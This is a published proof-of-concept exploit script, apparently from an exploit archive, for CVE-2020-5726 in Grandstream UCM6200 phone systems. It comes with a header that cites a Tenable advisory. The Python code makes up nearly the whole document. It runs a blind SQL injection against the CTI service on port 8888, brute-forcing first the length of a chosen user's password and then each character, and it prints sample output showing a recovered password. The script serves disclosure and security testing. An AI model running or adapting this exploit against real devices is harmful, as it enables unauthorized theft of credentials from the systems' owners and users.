# Exploit Title: Grandstream UCM6200 Series CTI Interface - 'user_password' SQL Injection
# Date: 2020-03-30
# Exploit Author: Jacob Baines
# Vendor Homepage: http://www.grandstream.com/
# Software Link: http://www.grandstream.com/support/firmware/ucm62xx-official-firmware
# Version: 1.0.20.20 and below
# Tested on: Grandstream UCM6202 1.0.20.20
# CVE : CVE-2020-5726
# Grandstream UCM6200 Series CTI Interface SQL Injection Password Disclosure
# Advisory: https://www.tenable.com/security/research/tra-2020-17
# Sample output:
#
# albinolobster@ubuntu:~$ python3 cti_injection.py --rhost 192.168.2.1
--user lolwat
# [+] Reaching out to 192.168.2.1:8888
# [+] Password length 9
# [+] The password is LabPass1%

import sys
import time
import json
import struct
import socket
import argparse

def send_cti_with_length(sock, payload):
    to_send = struct.pack('>I', len(payload))
    to_send = to_send + payload
    sock.sendall(to_send)

    return recv_cti_with_length(sock)

def recv_cti_with_length(sock):
    length = sock.recv(4)
    length = struct.unpack('>I', length)[0]
    response = sock.recv(length)
    return response

top_parser = argparse.ArgumentParser(description='')
top_parser.add_argument('--rhost', action="store", dest="rhost",
required=True, help="The remote host to connect to")
top_parser.add_argument('--rport', action="store", dest="rport", type=int,
help="The remote port to connect to", default=8888)
top_parser.add_argument('--user', action="store", dest="user",
required=True, help="The user to brute force")
args = top_parser.parse_args()


print('[+] Reaching out to ' + args.rhost + ':' + str(args.rport))

length = 0
while length < 100:

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((args.rhost, args.rport))

    challenge_resp = send_cti_with_length(sock, b"action=challenge&user=" +
args.user.encode('utf-8') + b"' AND LENGTH(user_password)=" +
str(length).encode('utf-8') + b"--")
    inject_result = json.loads(challenge_resp)

    if (inject_result['status'] == 0):
        break
    else:
        length = length + 1

    sock.close()

if length == 100:
    print('[-] Failed to discover the password length')
    sys.exit(1)

print('[+] Password length', length)

password = ''
while len(password) < length:
    value = 0x20
    while value < 0x80:

        if value == 0x22 or value == 0x5c:
            temp_pass = password + '\\'
            temp_pass = temp_pass + chr(value)
        else:
            temp_pass = password + chr(value)

        temp_pass_len = len(temp_pass)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((args.rhost, args.rport))

        challenge_resp = send_cti_with_length(sock,
b"action=challenge&user=" + args.user.encode('utf-8') + b"' AND
user_password LIKE \'" + temp_pass.encode('utf-8') + b"%' AND
substr(user_password,1," + str(temp_pass_len).encode('utf-8') + b") = '" +
temp_pass.encode('utf-8') + b"'--")
        inject_result = json.loads(challenge_resp)

        sock.close()

        if (inject_result['status'] == 0):
            password = temp_pass
            break
        else:
            value = value + 1
            continue

    if value == 0x80:
        print('oh no.')
        sys.exit(0)

print('[+] The password is', password)